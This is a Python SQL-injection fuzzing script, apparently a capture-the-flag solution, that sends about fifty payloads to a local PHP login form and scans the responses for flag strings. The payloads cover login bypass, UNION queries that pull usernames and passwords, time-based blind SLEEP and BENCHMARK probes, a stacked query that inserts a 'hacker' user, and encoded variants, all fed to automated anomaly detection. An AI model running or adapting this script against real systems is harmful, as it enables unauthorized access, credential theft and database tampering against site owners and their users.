import requests
import time
import urllib.parse
import sys

# Target URL
target_url = "http://127.0.0.1:33131/index.php"

# Comprehensive list of SQL injection payloads
payloads = [
    # Boolean-based injection (TRUE conditions)
    ("admin' OR '1'='1'-- ", "boolean_true", "Basic OR true condition"),
    ("admin' OR '1'='1'#", "boolean_true", "OR true with hash comment"),
    ("admin' OR '1'='1'/*", "boolean_true", "OR true with block comment"),
    ("' OR '1'='1'-- ", "boolean_true", "OR true condition"),
    ("' OR '1'='1'#", "boolean_true", "OR true with hash comment"),
    ("' OR 1=1-- ", "boolean_true", "OR 1=1"),
    ("' OR 1=1#", "boolean_true", "OR 1=1 with hash"),
    ("' OR 1=1/*", "boolean_true", "OR 1=1 with block comment"),
    ("1' OR '1'='1'#", "boolean_true", "Numerical OR condition"),
    ("' OR 'a'='a'-- ", "boolean_true", "String comparison true"),
    
    # Boolean-based injection (FALSE conditions for comparison)
    ("admin' AND '1'='2'-- ", "boolean_false", "AND false condition"),
    ("' AND '1'='2'-- ", "boolean_false", "AND false"),
    ("' OR '1'='2'-- ", "boolean_false", "OR false"),
    
    # Authentication bypass patterns
    ("admin'-- ", "bypass", "Comment out password check"),
    ("admin'#", "bypass", "Hash comment bypass"),
    ("admin'/*", "bypass", "Block comment bypass"),
    ("'-- ", "bypass", "Single quote comment"),
    ("'#", "bypass", "Single quote hash comment"),
    ("' OR ''='", "bypass", "Empty string comparison"),
    
    # Union-based injection (information gathering)
    ("' UNION SELECT 1,2,3-- ", "union", "Union select 1,2,3"),
    ("' UNION SELECT null,null,null-- ", "union", "Union with nulls"),
    ("' UNION SELECT user(),database(),version()-- ", "union", "Extract DB info"),
    ("' UNION SELECT username,password FROM users-- ", "union", "Extract credentials"),
    
    # Time-based blind injection
    ("' OR SLEEP(5)-- ", "time_based", "MySQL SLEEP"),
    ("' OR SLEEP(5)#", "time_based", "MySQL SLEEP with hash"),
    ("admin' AND SLEEP(5)-- ", "time_based", "SLEEP with AND"),
    ("' OR BENCHMARK(5000000,MD5('test'))-- ", "time_based", "BENCHMARK function"),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ", "time_based", "Subquery SLEEP"),
    ("' OR IF(1=1,SLEEP(5),0)-- ", "time_based", "IF condition with SLEEP"),
    ("' OR IF(1=2,SLEEP(5),0)-- ", "time_based", "IF false condition"),
    
    # Advanced boolean blind
    ("' OR SUBSTRING(database(),1,1)='a'-- ", "boolean_blind", "Check DB name"),
    ("' OR LENGTH(database())=5-- ", "boolean_blind", "Check DB length"),
    ("' OR (SELECT COUNT(*) FROM information_schema.tables)>0-- ", "boolean_blind", "Check table existence"),
    
    # Encoding variations
    ("admin%27%20OR%20%271%27%3D%271%27%23", "url_encoded", "URL encoded OR true"),
    ("%27%20OR%20SLEEP%285%29--%20", "url_encoded", "URL encoded SLEEP"),
    ("%61%64%6d%69%6e%27%20%4f%52%20%27%31%27%3d%27%31%27%23", "url_encoded", "Fully hex encoded"),
    
    # Case variations
    ("admin' Or '1'='1'-- ", "case_variation", "Mixed case OR"),
    ("admin' oR '1'='1'-- ", "case_variation", "Lowercase OR"),
    ("' OR Sleep(5)-- ", "case_variation", "Mixed case SLEEP"),
    
    # Error-based patterns
    ("' AND (SELECT 1 FROM (SELECT SLEEP(5))A)-- ", "error_based", "Subquery error"),
    ("' OR (SELECT 1 FROM dual WHERE 1=SLEEP(5))-- ", "error_based", "Dual table SLEEP"),
    
    # Double injection
    ("'; INSERT INTO users VALUES('hacker','password')-- ", "stacked", "Stacked query"),
    
    # Second-order injection patterns
    ("admin' AND '1'='1' UNION SELECT 1-- ", "second_order", "Second order union"),
    
    # Special character variations
    ("admin\" OR \"1\"=\"1\"-- ", "char_variation", "Double quote variant"),
    ("admin` OR `1`=`1`-- ", "char_variation", "Backtick variant"),
    
    # Parentheses bypass
    ("') OR '1'='1'-- ", "parentheses", "Parentheses closure"),
    ("') OR ('1')=('1'-- ", "parentheses", "Parentheses with OR"),
]

print(f"[*] Starting SQL Injection Fuzzing - Testing {len(payloads)} payloads")
print(f"[*] Target: {target_url}")
print(f"[*] Baseline requests will determine normal behavior\n")

# Establish baseline with normal credentials
print("[*] Phase 1: Establishing Baseline with Normal Login")
baseline_times = []
baseline_responses = []

for i in range(3):
    try:
        start_time = time.time()
        response = requests.post(
            target_url,
            data={"username": "admin", "password": "admin"},
            timeout=10
        )
        end_time = time.time()
        
        response_time = end_time - start_time
        baseline_times.append(response_time)
        baseline_responses.append({
            'status': response.status_code,
            'length': len(response.content),
            'content': response.text,
            'time': response_time
        })
        
        print(f"    Baseline {i+1}: Status={response.status_code}, Time={response_time:.3f}s, Length={len(response.content)}B")
        
    except Exception as e:
        print(f"    Baseline {i+1} failed: {e}")

if not baseline_times:
    print("[!] Error: Could not establish baseline. Exiting.")
    sys.exit(1)

avg_baseline_time = sum(baseline_times) / len(baseline_times)
avg_baseline_length = sum(r['length'] for r in baseline_responses) / len(baseline_responses)
print(f"[*] Baseline Averages - Time: {avg_baseline_time:.3f}s, Length: {avg_baseline_length:.0f}B")
print(f"[*] Anomalies detected if response time > {avg_baseline_time + 3.0:.3f}s or length differs by > 10%\n")

# Test all payloads
print("[*] Phase 2: Testing SQL Injection Payloads")
print("-" * 80)
print(f"{'#':<3} {'Type':<15} {'Payload':<40} {'Status':<6} {'Time':<8} {'Length':<8} {'Anomaly':<15}")
print("-" * 80)

anomalies_found = []
successful_payloads = []
time_based_vulns = []
boolean_based_vulns = []

for idx, (payload, ptype, description) in enumerate(payloads, 1):
    try:
        # Send request with payload
        start_time = time.time()
        response = requests.post(
            target_url,
            data={"username": payload, "password": "test"},
            timeout=15
        )
        end_time = time.time()
        
        response_time = end_time - start_time
        response_length = len(response.content)
        
        # Analyze for anomalies
        is_anomaly = False
        anomaly_type = []
        
        # Check for time-based anomaly (slower than baseline)
        if response_time > avg_baseline_time + 3.0:
            is_anomaly = True
            anomaly_type.append(f"TIME+{response_time-avg_baseline_time:.1f}s")
            time_based_vulns.append({
                'payload': payload,
                'time': response_time,
                'baseline': avg_baseline_time
            })
        
        # Check for length-based anomaly
        length_diff = abs(response_length - avg_baseline_length) / avg_baseline_length
        if length_diff > 0.10:  # > 10% difference
            is_anomaly = True
            anomaly_type.append(f"LEN±{length_diff*100:.0f}%")
            boolean_based_vulns.append({
                'payload': payload,
                'length': response_length,
                'baseline': avg_baseline_length
            })
        
        # Check for status code anomaly
        baseline_status = baseline_responses[0]['status']
        if response.status_code != baseline_status:
            is_anomaly = True
            anomaly_type.append(f"STATUS:{response.status_code}")
        
        # Check for content differences (basic)
        if response.status_code == 200 and len(response.text) > 0:
            baseline_content = baseline_responses[0]['content']
            if "login" not in response.text.lower() and "login" in baseline_content.lower():
                is_anomaly = True
                anomaly_type.append("NO_LOGIN")
                successful_payloads.append(payload)
        
        anomaly_str = " | ".join(anomaly_type) if anomaly_type else "None"
        
        # Color-coded output for anomalies
        if is_anomaly:
            print(f"[!] {idx:<2} {ptype:<15} {payload[:38]:<40} {response.status_code:<6} {response_time:<8.3f} {response_length:<8} {anomaly_str:<15}")
            anomalies_found.append({
                'id': idx,
                'payload': payload,
                'type': ptype,
                'description': description,
                'status': response.status_code,
                'time': response_time,
                'length': response_length,
                'anomalies': anomaly_type
            })
        else:
            print(f"[ ] {idx:<2} {ptype:<15} {payload[:38]:<40} {response.status_code:<6} {response_time:<8.3f} {response_length:<8} {anomaly_str:<15}")
        
    except requests.exceptions.Timeout:
        print(f"[!] {idx:<2} {ptype:<15} {payload[:38]:<40} TIMEOUT              TIMEOUT  TIMEOUT  TIMEOUT")
        anomalies_found.append({
            'id': idx,
            'payload': payload,
            'type': ptype,
            'status': 'TIMEOUT',
            'anomalies': ['TIMEOUT']
        })
    except Exception as e:
        print(f"[!] {idx:<2} {ptype:<15} {payload[:38]:<40} ERROR:{str(e)[:10]}")
        anomalies_found.append({
            'id': idx,
            'payload': payload,
            'type': ptype,
            'status': 'ERROR',
            'anomalies': ['ERROR']
        })

print("\n" + "="*80)
print("[*] FUZZING COMPLETE - SUMMARY")
print("="*80)
print(f"Total payloads tested: {len(payloads)}")
print(f"Anomalies detected: {len(anomalies_found)}")
print(f"Potential successful bypasses: {len(successful_payloads)}")
print(f"Potential time-based vulns: {len(time_based_vulns)}")
print(f"Potential boolean-based vulns: {len(boolean_based_vulns)}")

if anomalies_found:
    print("\n[!] DETAILED ANOMALY REPORT")
    print("-" * 80)
    
    # Time-based vulnerabilities
    if time_based_vulns:
        print("\n[+] Potential TIME-BASED SQL Injection (Slow responses):")
        for vuln in time_based_vulns[:5]:  # Show top 5
            print(f"    Payload {vuln['payload'][:50]}")
            print(f"    Response time: {vuln['time']:.3f}s (baseline: {vuln['baseline']:.3f}s)")
            print(f"    Time difference: +{vuln['time'] - vuln['baseline']:.3f}s")
            print()
    
    # Boolean-based vulnerabilities
    if boolean_based_vulns:
        print("\n[+] Potential BOOLEAN-BASED SQL Injection (Length differences):")
        for vuln in boolean_based_vulns[:5]:
            print(f"    Payload: {vuln['payload'][:50]}")
            print(f"    Response length: {vuln['length']}B (baseline: {vuln['baseline']:.0f}B)")
            print(f"    Difference: {abs(vuln['length'] - vuln['baseline']):.0f}B ({abs(vuln['length'] - vuln['baseline'])/vuln['baseline']*100:.1f}%)")
            print()
    
    # Successful bypasses
    if successful_payloads:
        print("\n[+] Successful Authentication Bypass Likely:")
        for sp in successful_payloads:
            print(f"    - {sp}")
        print()
    
    # All anomalies
    print("\n[+] ALL ANOMALIES:")
    for anomaly in anomalies_found:
        print(f"\n[ANOMALY #{anomaly['id']}] Type: {anomaly['type']}")
        print(f"  Payload: {anomaly['payload']}")
        print(f"  Description: {anomaly['description']}")
        print(f"  Status: {anomaly['status']}")
        print(f"  Response Time: {anomaly['time']:.3f}s")
        print(f"  Response Length: {anomaly['length']}B")
        print(f"  Issue Types: {', '.join(anomaly['anomalies'])}")

else:
    print("\n[-] No anomalies detected - SQL injection may not be present or requires manual verification")

# Additional analysis
print("\n" + "="*80)
print("[*] ANALYSIS NOTES")
print("="*80)
print("Time-based detection: Look for payloads where response time > baseline + 3s")
print("Boolean-based detection: Look for consistent length differences between TRUE/FALSE")
print("Authentication bypass: 'NO_LOGIN' anomaly suggests bypassed login form")
print("Status code changes: May indicate different authentication outcomes")

# Check for any flags in responses
print("\n[*] SEARCHING FOR FLAGS IN RESPONSES")
print("-" * 80)
import re
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)
flags_found = []

for anomaly in anomalies_found:
    if anomaly.get('status') == 200 and isinstance(anomaly.get('time'), float):
        # Search would happen here if we stored response content
        pass

# Since we didn't store all response content, let's make a focused search
print("Checking anomalies for flags...")
for anomaly in anomalies_found[:10]:
    try:
        response = requests.post(
            target_url,
            data={"username": anomaly['payload'], "password": "test"},
            timeout=10
        )
        flags = flag_pattern.findall(response.text)
        if flags:
            flags_found.extend(flags)
            print(f"[!] FLAG FOUND with payload: {anomaly['payload']}")
            print(f"    Flag: {flags}")
    except:
        pass

if flags_found:
    print(f"\n[!] TOTAL FLAGS FOUND: {len(flags_found)}")
    for flag in set(flags_found):
        print(f"    {flag}")
else:
    print("[-] No flags found in initial anomaly responses")
    print("[*] Recommend manual verification of anomalous payloads")

print("\n[*] Fuzzing complete. Review anomalies for potential SQL injection evidence.")
print("[*] For time-based: Verify delays are consistent")
print("[*] For boolean-based: Test TRUE/FALSE conditions individually")
print("[*] For bypass: Check if login was actually bypassed")
